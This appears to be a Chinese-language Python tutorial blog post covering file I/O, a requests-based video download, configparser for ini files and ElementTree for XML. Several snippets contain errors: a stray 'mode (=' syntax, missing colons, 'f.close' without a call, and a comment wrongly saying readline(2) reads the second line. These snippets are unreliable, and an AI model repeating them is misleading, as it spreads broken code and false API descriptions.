<h4 id="1-4-3readline-读一行"><a href="#1-4-3readline-读一行" class="headerlink" title="1.4.3readline()读一行"></a>1.4.3readline()读一行</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;info.txt&#x27;</span>,mode = <span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">data = f.readline(<span class="number">2</span>)<span class="comment">#读取第二行的内容</span></span><br><span class="line"><span class="comment">#一般用于处理庞大的文件，如果直接用read会导致内存崩溃，but readline每次只读取一行内容，极大的减少了内存的负担。</span></span><br></pre></td></tr></table></figure>

<h4 id="1-4-4readlines-读取所有行，返回一个列表，其中每一个元素是每一行的内容。"><a href="#1-4-4readlines-读取所有行，返回一个列表，其中每一个元素是每一行的内容。" class="headerlink" title="1.4.4readlines()读取所有行，返回一个列表，其中每一个元素是每一行的内容。"></a>1.4.4readlines()读取所有行，返回一个列表，其中每一个元素是每一行的内容。</h4><h4 id="1-4-5for循环"><a href="#1-4-5for循环" class="headerlink" title="1.4.5for循环"></a>1.4.5for循环</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;info.txt&#x27;</span>,mode = <span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">    <span class="built_in">print</span>(line.strip())<span class="comment">#删除每一行的换行符，因为每一次循环print的时候也会有一个换行符。</span></span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">小丑</span></span><br><span class="line"><span class="string">动感</span></span><br><span class="line"><span class="string">joker</span></span><br><span class="line"><span class="string">你好</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="1-4-6write，写"><a href="#1-4-6write，写" class="headerlink" title="1.4.6write，写"></a>1.4.6write，写</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;info.txt&#x27;</span>,mode = <span class="string">&#x27;a&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">f.write(<span class="string">&quot;dhk&quot;</span>)</span><br><span class="line">f.close</span><br></pre></td></tr></table></figure>

<h4 id="1-4-7flush-刷到硬盘"><a href="#1-4-7flush-刷到硬盘" class="headerlink" title="1.4.7flush,刷到硬盘"></a>1.4.7flush,刷到硬盘</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;info.txt&#x27;</span>,mode = <span class="string">&#x27;a&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    f.write(<span class="string">&quot;dhk&quot;</span>)</span><br><span class="line">    <span class="comment">#不是写到了硬盘，而是写在缓冲区，系统会将缓冲区的内容刷到硬盘。</span></span><br><span class="line">    f.flush()<span class="comment">#直接刷到硬盘</span></span><br><span class="line">f.close</span><br></pre></td></tr></table></figure>

<h4 id="1-4-8移动光标位置（字节）"><a href="#1-4-8移动光标位置（字节）" class="headerlink" title="1.4.8移动光标位置（字节）"></a>1.4.8移动光标位置（字节）</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;info.txt&#x27;</span>,mode (= <span class="string">&#x27;r+&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">f.seek(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#将光标移动到指定位置。</span></span><br></pre></td></tr></table></figure>

<p>注意：在a模式下，write只会写到文件的最后，不会写到指定的光标位置。</p>
<h4 id="1-4-9获取光标位置"><a href="#1-4-9获取光标位置" class="headerlink" title="1.4.9获取光标位置"></a>1.4.9获取光标位置</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;info.txt&#x27;</span>,mode (= <span class="string">&#x27;r+&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">p1 = f.tell()</span><br><span class="line"><span class="built_in">print</span>(p1)         </span><br></pre></td></tr></table></figure>

<h3 id="1-5上下文管理"><a href="#1-5上下文管理" class="headerlink" title="1.5上下文管理"></a>1.5上下文管理</h3><p>之前对文件进行操作的时候，每次都要打开和关闭文件，比较繁琐且容易忘记关闭文件。</p>
<p>以后再进行文件操作时，推荐大家使用with上下文管理，他可以实现自动关闭文件。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;info.txt&#x27;</span>,mode (= <span class="string">&#x27;r+&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f</span><br><span class="line">          data = f.read()</span><br><span class="line">          <span class="built_in">print</span>(data)</span><br><span class="line"><span class="comment">#在缩进结束的时候，他就会自动的帮你关闭文件。</span></span><br></pre></td></tr></table></figure>

<p>在python2.7后，with又支持同时对多个文件的上下文进行管理，即：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;info.txt&#x27;</span>,mode (= <span class="string">&#x27;r+&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f,<span class="built_in">open</span>(<span class="string">&#x27;info2.txt&#x27;</span>,mode (= <span class="string">&#x27;r+&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f2</span><br><span class="line">                                                              <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<h3 id="1-6功能扩展：从指定的网址爬取视频"><a href="#1-6功能扩展：从指定的网址爬取视频" class="headerlink" title="1.6功能扩展：从指定的网址爬取视频"></a>1.6功能扩展：从指定的网址爬取视频</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;user-agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36&quot;</span>,</span><br><span class="line">&#125;<span class="comment">#指定文件头</span></span><br><span class="line">url =<span class="string">&quot;https://video.pearvideo.com/mp4/adshort/20200709/cont-1684816-15252785_adpkg-ad_hd.mp4&quot;</span></span><br><span class="line">response = requests.get(url,headers=headers,stream=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#介绍一下这个stream模块</span></span><br><span class="line"><span class="comment">#当stream=True时，如果是下载大的文件时，用True，可以先对请求的类型进行判断，如果是大文件，可以中止请求，而不用浪费大流量开销。如果不加stream=True，那么硬盘很可能就不停被写入，文件会变得无比巨大，最后磁盘空间不够死机。</span></span><br><span class="line"><span class="comment">#当stream=False时，如果是请求的大文件，其会进入内存并进行下载，消费大量的内存和流量。</span></span><br><span class="line"><span class="built_in">print</span>(response.status_code)</span><br><span class="line"><span class="built_in">print</span>(response.headers[<span class="string">&#x27;content-length&#x27;</span>])</span><br><span class="line">content_size = <span class="built_in">int</span>(response.headers[<span class="string">&#x27;content-length&#x27;</span>])</span><br><span class="line"><span class="comment"># print(response.text)</span></span><br><span class="line"><span class="comment"># print(response.content)</span></span><br><span class="line">n = <span class="number">1</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;v.mp4&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> response.iter_content(chunk_size=<span class="number">1024</span>):<span class="comment">#这个进度条我是偷别人的嘿嘿。</span></span><br><span class="line">        rate=n*<span class="number">1024</span>/content_size</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;下载进度：&#123;0:%&#125;&quot;</span>.<span class="built_in">format</span>(rate))</span><br><span class="line">        f.write(i)</span><br><span class="line">        n+=<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;下载完成&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>第二个扩展，将一个文件中的其中一个字符修改成另外一个字符</p>
<p>小文件：文件读到内存，再通过replace</p>
<p>大小文件都可以使用：同时打开两个文件，读+写</p>
<p>这里演示一下第二种思路。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;info.txt&#x27;</span>,mode=<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> c1 , <span class="built_in">open</span>(<span class="string">&#x27;new.txt&#x27;</span>,mode=<span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> c2:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> c1:</span><br><span class="line">        new_line = line.replace(<span class="string">&#x27;joker&#x27;</span>,<span class="string">&#x27;dhk&#x27;</span>)</span><br><span class="line">        c2.write(<span class="string">f&#x27;<span class="subst">&#123;new_line&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment">#重命名文件之后就可以覆盖掉原文件</span></span><br><span class="line"><span class="comment">#imort shutil</span></span><br><span class="line"><span class="comment">#shutil.move(&#x27;new.txt&#x27;,&#x27;info.txt&#x27;)</span></span><br></pre></td></tr></table></figure>

<h2 id="2-csv格式文件"><a href="#2-csv格式文件" class="headerlink" title="2.csv格式文件"></a>2.csv格式文件</h2><p>逗号分隔值（有时候也被称为字符分隔值），其文件以纯文本形式 储存表格数据（数字和文本）。</p>
<p>对于这种格式的数据，我们需要利用open函数来读取文件并根据逗号分隔的特点进行处理。</p>
<h3 id="2-1扩充函数"><a href="#2-1扩充函数" class="headerlink" title="2.1扩充函数"></a>2.1扩充函数</h3><p>在当前根目录下创建一个文件夹。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">os.makedirs(<span class="string">&quot;name&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="3-ini格式"><a href="#3-ini格式" class="headerlink" title="3.ini格式"></a>3.ini格式</h2><p>ini文件是initialization File的缩写，平时用于储存软件的配置文件。例如：Mysql数据库的配置文件。</p>
<p><a href="https://www.cnblogs.com/jhabb/archive/2010/12/01/1893454.html">ini文件示例说明 - 落冰 - 博客园 (cnblogs.com)</a></p>
<p>这种格式是可以直接使用open出来，考虑到自己处理比较麻烦，所以python为我们提供了更为方便的方式。</p>
<h3 id="3-1读取所有节点"><a href="#3-1读取所有节点" class="headerlink" title="3.1读取所有节点"></a>3.1读取所有节点</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> configparser</span><br><span class="line">config = configparser.ConfigParser()</span><br><span class="line">config.read(<span class="string">&#x27;mysql.ini&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)<span class="comment">#可以是相对路径也可以是绝对路径</span></span><br><span class="line">result = config.sections()<span class="comment">#获取所有的节点，返回一个列表</span></span><br></pre></td></tr></table></figure>

<h3 id="3-2获取节点下面的键值"><a href="#3-2获取节点下面的键值" class="headerlink" title="3.2获取节点下面的键值"></a>3.2获取节点下面的键值</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> configparser</span><br><span class="line">config = configparser.ConfigParser()</span><br><span class="line">config.read(<span class="string">&#x27;mysql.ini&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)<span class="comment">#可以是相对路径也可以是绝对路径</span></span><br><span class="line">result = config.items(<span class="string">&#x27;节点&#x27;</span>)<span class="comment">#获取指定节点下面的键值，返回一个嵌套着元组的列表。</span></span><br></pre></td></tr></table></figure>

<h3 id="3-3获取某一个节点下的键对应的值"><a href="#3-3获取某一个节点下的键对应的值" class="headerlink" title="3.3获取某一个节点下的键对应的值"></a>3.3获取某一个节点下的键对应的值</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> configparser</span><br><span class="line">config = configparser.ConfigParser()</span><br><span class="line">config.read(<span class="string">&#x27;mysql.ini&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)<span class="comment">#可以是相对路径也可以是绝对路径</span></span><br><span class="line">result = config.get(<span class="string">&#x27;节点&#x27;</span>,<span class="string">&#x27;键&#x27;</span>)<span class="comment">#获取某一个节点下的键对应的值</span></span><br></pre></td></tr></table></figure>

<h3 id="3-4其他功能"><a href="#3-4其他功能" class="headerlink" title="3.4其他功能"></a>3.4其他功能</h3><h4 id="3-4-1判断文件是否有这个节点"><a href="#3-4-1判断文件是否有这个节点" class="headerlink" title="3.4.1判断文件是否有这个节点"></a>3.4.1判断文件是否有这个节点</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> configparser</span><br><span class="line">config = configparser.ConfigParser()</span><br><span class="line">config.read(<span class="string">&#x27;mysql.ini&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)<span class="comment">#可以是相对路径也可以是绝对路径</span></span><br><span class="line">result = config.has_section(<span class="string">&#x27;节点&#x27;</span>)<span class="comment">#判断是否有这个节点，返回布尔值。</span></span><br></pre></td></tr></table></figure>

<h4 id="3-4-2添加一个节点"><a href="#3-4-2添加一个节点" class="headerlink" title="3.4.2添加一个节点"></a>3.4.2添加一个节点</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> configparser</span><br><span class="line">config = configparser.ConfigParser()</span><br><span class="line">config.read(<span class="string">&#x27;mysql.ini&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)<span class="comment">#可以是相对路径也可以是绝对路径)</span></span><br><span class="line">config.add_section(<span class="string">&#x27;节点&#x27;</span>)<span class="comment">#只是写到内存中，但是没有到硬盘中</span></span><br><span class="line">config.<span class="built_in">set</span>(<span class="string">&#x27;节点&#x27;</span>,<span class="string">&#x27;键&#x27;</span>,<span class="string">&#x27;值&#x27;</span>,)</span><br><span class="line">config.write(<span class="built_in">open</span>(<span class="string">&#x27;文件名&#x27;</span>,mode=<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>))<span class="comment">#这样才会写到文件里面</span></span><br></pre></td></tr></table></figure>

<h4 id="3-4-3删除"><a href="#3-4-3删除" class="headerlink" title="3.4.3删除"></a>3.4.3删除</h4><p>删除节点</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> configparser</span><br><span class="line">config = configparser.ConfigParser()</span><br><span class="line">config.read(<span class="string">&#x27;mysql.ini&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)<span class="comment">#可以是相对路径也可以是绝对路径)</span></span><br><span class="line">config.remove_section(<span class="string">&#x27;节点&#x27;</span>)</span><br><span class="line">config.write(<span class="built_in">open</span>(<span class="string">&#x27;文件名&#x27;</span>,mode=<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>删除键</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">config.remove_option(<span class="string">&#x27;节点&#x27;</span>,<span class="string">&#x27;键&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="4-XML格式文件"><a href="#4-XML格式文件" class="headerlink" title="4.XML格式文件"></a>4.XML格式文件</h2><p>可扩展标记语言，是一种简单的数据存储语言，XML被设计用来传输和存储数据。</p>
<p>1.存储，可用来存放配置文件，例如：java的配置文件。</p>
<p>2.传输，网络传输是以这种格式存在，例如早期ajax传输的数据集，soap协议等。</p>
<p><a href="https://blog.csdn.net/qq_34272143/article/details/87164488">(27条消息) XML文件详解以及解析_浮华蒲公英的博客-CSDN博客_xml文件</a></p>
<h3 id="4-1以country-xml为例，内容如下"><a href="#4-1以country-xml为例，内容如下" class="headerlink" title="4.1以country.xml为例，内容如下"></a>4.1以country.xml为例，内容如下</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span> <span class="attr">name</span>=<span class="string">&quot;Liechtenstein&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rank</span> <span class="attr">updated</span>=<span class="string">&quot;yes&quot;</span>&gt;</span>2<span class="tag">&lt;/<span class="name">rank</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">year</span>&gt;</span>2008<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">gdppc</span>&gt;</span>141100<span class="tag">&lt;/<span class="name">gdppc</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">neighbor</span> <span class="attr">name</span>=<span class="string">&quot;Austria&quot;</span> <span class="attr">direction</span>=<span class="string">&quot;E&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">neighbor</span> <span class="attr">name</span>=<span class="string">&quot;Switzerland&quot;</span> <span class="attr">direction</span>=<span class="string">&quot;W&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span> <span class="attr">name</span>=<span class="string">&quot;Singapore&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rank</span> <span class="attr">updated</span>=<span class="string">&quot;yes&quot;</span>&gt;</span>5<span class="tag">&lt;/<span class="name">rank</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">year</span>&gt;</span>2011<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">gdppc</span>&gt;</span>59900<span class="tag">&lt;/<span class="name">gdppc</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">neighbor</span> <span class="attr">name</span>=<span class="string">&quot;Malaysia&quot;</span> <span class="attr">direction</span>=<span class="string">&quot;N&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span> <span class="attr">name</span>=<span class="string">&quot;Panama&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rank</span> <span class="attr">updated</span>=<span class="string">&quot;yes&quot;</span>&gt;</span>69<span class="tag">&lt;/<span class="name">rank</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">year</span>&gt;</span>2011<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">gdppc</span>&gt;</span>13600<span class="tag">&lt;/<span class="name">gdppc</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">neighbor</span> <span class="attr">name</span>=<span class="string">&quot;Costa Rica&quot;</span> <span class="attr">direction</span>=<span class="string">&quot;W&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">neighbor</span> <span class="attr">name</span>=<span class="string">&quot;Colombia&quot;</span> <span class="attr">direction</span>=<span class="string">&quot;E&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="4-2解析"><a href="#4-2解析" class="headerlink" title="4.2解析"></a>4.2解析</h3><p>1)调用parse()方法，返回解析树</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3.3之后ElementTree模块会自动寻找可用的C库来加快速度</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">import</span> xml.etree.cElementTree <span class="keyword">as</span> ET</span><br><span class="line"><span class="keyword">except</span> ImportError:</span><br><span class="line">    <span class="keyword">import</span> xml.etree.ElementTree <span class="keyword">as</span> ET</span><br><span class="line"></span><br><span class="line">tree = ET.parse(<span class="string">&quot;country.xml&quot;</span>)  <span class="comment"># &lt;class &#x27;xml.etree.ElementTree.ElementTree&#x27;&gt;</span></span><br><span class="line">root = tree.getroot()           <span class="comment"># 获取根节点 &lt;Element &#x27;data&#x27; at 0x02BF6A80&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="2-调用from-string-返回解析树的根元素"><a href="#2-调用from-string-返回解析树的根元素" class="headerlink" title="2)调用from_string(),返回解析树的根元素"></a>2)调用from_string(),返回解析树的根元素</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xml.etree.ElementTree <span class="keyword">as</span> ET</span><br><span class="line">data = <span class="built_in">open</span>(<span class="string">&quot;country.xml&quot;</span>).read()</span><br><span class="line">root = ET.fromstring(data)   <span class="comment"># &lt;Element &#x27;data&#x27; at 0x036168A0&gt;</span></span><br></pre></td></tr></table></figure>

<p>3)调用ElementTree类ElementTree(self, element=None, file=None)  # 这里的element作为根节点</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xml.etree.ElementTree <span class="keyword">as</span> ET</span><br><span class="line">tree = ET.ElementTree(file=<span class="string">&quot;country.xml&quot;</span>)  <span class="comment"># &lt;xml.etree.ElementTree.ElementTree object at 0x03031390&gt;</span></span><br><span class="line">root = tree.getroot()  <span class="comment"># &lt;Element &#x27;data&#x27; at 0x030EA600&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="4-3遍历"><a href="#4-3遍历" class="headerlink" title="4.3遍历"></a>4.3遍历</h3><p>1)简单遍历</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xml.etree.ElementTree <span class="keyword">as</span> ET</span><br><span class="line"></span><br><span class="line">tree = ET.parse(<span class="string">&quot;country.xml&quot;</span>)</span><br><span class="line">root = tree.getroot()</span><br><span class="line"><span class="built_in">print</span>(root.tag, <span class="string">&quot;:&quot;</span>, root.attrib)  <span class="comment"># 打印根元素的tag和属性</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历xml文档的第二层</span></span><br><span class="line"><span class="keyword">for</span> child <span class="keyword">in</span> root:</span><br><span class="line">    <span class="comment"># 第二层节点的标签名称和属性</span></span><br><span class="line">    <span class="built_in">print</span>(child.tag,<span class="string">&quot;:&quot;</span>, child.attrib) </span><br><span class="line">    <span class="comment"># 遍历xml文档的第三层</span></span><br><span class="line">    <span class="keyword">for</span> children <span class="keyword">in</span> child:</span><br><span class="line">        <span class="comment"># 第三层节点的标签名称和属性</span></span><br><span class="line">        <span class="built_in">print</span>(children.tag, <span class="string">&quot;:&quot;</span>, children.attrib)</span><br></pre></td></tr></table></figure>

<p>可以通过下标的方式直接访问节点</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 访问根节点下第一个country的第二个节点year,获取对应的文本</span></span><br><span class="line">year = root[<span class="number">0</span>][<span class="number">1</span>].text    <span class="comment"># 2008</span></span><br></pre></td></tr></table></figure>

<p>2)ElementTree提供的方法</p>
<ul>
<li><code>find</code>(<em>match)                           # 查找第一个匹配的子元素， match可以时tag或是xpaht路径</em></li>
<li><em><code>findall</code>(*match*)                        # 返回所有匹配的子元素列表</em></li>
<li><code>findtext</code>(<em>match</em>, <em>default=None</em>)           # </li>
<li><code>iter</code>(<em>tag=None)                        # 以当前元素为根节点 创建树迭代器,如果tag不为None,则以tag进行过滤</em></li>
<li><em><code>iterfind</code>(*match*)                       #</em> </li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 过滤出所有neighbor标签</span></span><br><span class="line"><span class="keyword">for</span> neighbor <span class="keyword">in</span> root.<span class="built_in">iter</span>(<span class="string">&quot;neighbor&quot;</span>):</span><br><span class="line">    <span class="built_in">print</span>(neighbor.tag, <span class="string">&quot;:&quot;</span>, neighbor.attrib)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 遍历所有的counry标签</span></span><br><span class="line"><span class="keyword">for</span> country <span class="keyword">in</span> root.findall(<span class="string">&quot;country&quot;</span>):</span><br><span class="line">    <span class="comment"># 查找country标签下的第一个rank标签</span></span><br><span class="line">    rank = country.find(<span class="string">&quot;rank&quot;</span>).text</span><br><span class="line">    <span class="comment"># 获取country标签的name属性</span></span><br><span class="line">    name = country.get(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(name, rank)</span><br></pre></td></tr></table></figure>

<h3 id="4-4修改xml结构"><a href="#4-4修改xml结构" class="headerlink" title="4.4修改xml结构"></a>4.4修改xml结构</h3><ol>
<li>属性相关</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将所有的rank值加1,并添加属性updated为yes</span></span><br><span class="line"><span class="keyword">for</span> rank <span class="keyword">in</span> root.<span class="built_in">iter</span>(<span class="string">&quot;rank&quot;</span>):</span><br><span class="line">    new_rank = <span class="built_in">int</span>(rank.text) + <span class="number">1</span></span><br><span class="line">    rank.text = <span class="built_in">str</span>(new_rank)  <span class="comment"># 必须将int转为str</span></span><br><span class="line">    rank.<span class="built_in">set</span>(<span class="string">&quot;updated&quot;</span>, <span class="string">&quot;yes&quot;</span>) <span class="comment"># 添加属性</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 再终端显示整个xml</span></span><br><span class="line">ET.dump(root)</span><br><span class="line"><span class="comment"># 注意 修改的内容存在内存中 尚未保存到文件中</span></span><br><span class="line"><span class="comment"># 保存修改后的内容</span></span><br><span class="line">tree.write(<span class="string">&quot;output.xml&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xml.etree.ElementTree <span class="keyword">as</span> ET</span><br><span class="line"></span><br><span class="line">tree = ET.parse(<span class="string">&quot;output.xml&quot;</span>)</span><br><span class="line">root = tree.getroot()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> rank <span class="keyword">in</span> root.<span class="built_in">iter</span>(<span class="string">&quot;rank&quot;</span>):</span><br><span class="line">    <span class="comment"># attrib为属性字典</span></span><br><span class="line">    <span class="comment"># 删除对应的属性updated</span></span><br><span class="line">    <span class="keyword">del</span> rank.attrib[<span class="string">&#x27;updated&#x27;</span>]  </span><br><span class="line"></span><br><span class="line">ET.dump(root)</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>节点/元素 相关</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xml.etree.ElementTree <span class="keyword">as</span> ET</span><br><span class="line"></span><br><span class="line">tree = ET.parse(<span class="string">&quot;country.xml&quot;</span>)</span><br><span class="line">root = tree.getroot()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除rank大于50的国家</span></span><br><span class="line"><span class="keyword">for</span> country <span class="keyword">in</span> root.<span class="built_in">iter</span>(<span class="string">&quot;country&quot;</span>):</span><br><span class="line">    rank = <span class="built_in">int</span>(country.find(<span class="string">&quot;rank&quot;</span>).text)</span><br><span class="line">    <span class="keyword">if</span> rank &gt; <span class="number">50</span>:</span><br><span class="line">        <span class="comment"># remove()方法 删除子元素</span></span><br><span class="line">        root.remove(country)</span><br><span class="line"></span><br><span class="line">ET.dump(root)</span><br></pre></td></tr></table></figure>

<p>添加子元素</p>
<p>代码:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xml.etree.ElementTree <span class="keyword">as</span> ET</span><br><span class="line"></span><br><span class="line">tree = ET.parse(<span class="string">&quot;country.xml&quot;</span>)</span><br><span class="line">root = tree.getroot()</span><br><span class="line"></span><br><span class="line">country = root[<span class="number">0</span>]</span><br><span class="line">last_ele = country[<span class="built_in">len</span>(<span class="built_in">list</span>(country))-<span class="number">1</span>]</span><br><span class="line">last_ele.tail = <span class="string">&#x27;\n\t\t&#x27;</span></span><br><span class="line"><span class="comment"># 创建新的元素, tag为test_append</span></span><br><span class="line">elem1 = ET.Element(<span class="string">&quot;test_append&quot;</span>)</span><br><span class="line">elem1.text = <span class="string">&quot;elem 1&quot;</span></span><br><span class="line"><span class="comment"># elem.tail = &#x27;\n\t&#x27;</span></span><br><span class="line">country.append(elem1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># SubElement() 其实内部调用的时append()</span></span><br><span class="line">elem2 = ET.SubElement(country, <span class="string">&quot;test_subelement&quot;</span>)</span><br><span class="line">elem2.text = <span class="string">&quot;elem 2&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># extend()</span></span><br><span class="line">elem3 = ET.Element(<span class="string">&quot;test_extend&quot;</span>)</span><br><span class="line">elem3.text = <span class="string">&quot;elem 3&quot;</span></span><br><span class="line">elem4 = ET.Element(<span class="string">&quot;test_extend&quot;</span>)</span><br><span class="line">elem4.text = <span class="string">&quot;elem 4&quot;</span></span><br><span class="line">country.extend([elem3, elem4])</span><br><span class="line"></span><br><span class="line"><span class="comment"># insert()</span></span><br><span class="line">elem5 = ET.Element(<span class="string">&quot;test_insert&quot;</span>)</span><br><span class="line">elem5.text = <span class="string">&quot;elem 5&quot;</span></span><br><span class="line">country.insert(<span class="number">5</span>, elem5)</span><br><span class="line"></span><br><span class="line">ET.dump(country)</span><br></pre></td></tr></table></figure>

